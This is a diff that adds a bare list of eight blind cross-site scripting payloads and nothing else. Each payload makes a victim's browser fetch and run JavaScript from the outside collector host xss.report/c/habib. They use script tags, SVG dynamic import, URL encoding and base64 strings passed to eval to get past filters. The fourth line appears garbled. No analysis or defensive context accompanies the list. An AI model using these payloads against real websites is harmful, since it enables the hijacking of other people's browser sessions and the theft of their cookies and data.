@@ -1,0 +1,8 @@
+'"><script src=https://xss.report/c/habib></script>
+'"></title></textarea></script></style></noscript><script src=https://xss.report/c/habib></script>
+'%22%3E%3Cscript%20src=https://xss.report/c/habib%3E%3C/script%3E
+"><iframesrcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;#116;&#116;&#112;&#115;&#58;&#47;&#47;https://xss.report/c/habib&#34;&#59;&#117;&#109;&#101;&#110;&#116;&#46;&#62;">
+'"><Svg Src=//xss.report/c/habib/s OnLoad=import(this.getAttribute('src')+0)>
+%22%3E%3Cimg%20src=x%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hhYmliIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;%20onerror=eval(atob(this.id))%3E
+%3Cscript%3Efunction%20b()%7Beval(this.responseText)%7D;a=new%20XMLHttpRequest();a.addEventListener(%22load%22,%20b);a.open(%22GET%22,%20%22//xss.report/c/habib%22);a.send();%3C/script%3E
+%22%3E%3Cinput%20onfocus=eval(atob(this.id))%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hhYmliIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;%20autofocus%3E
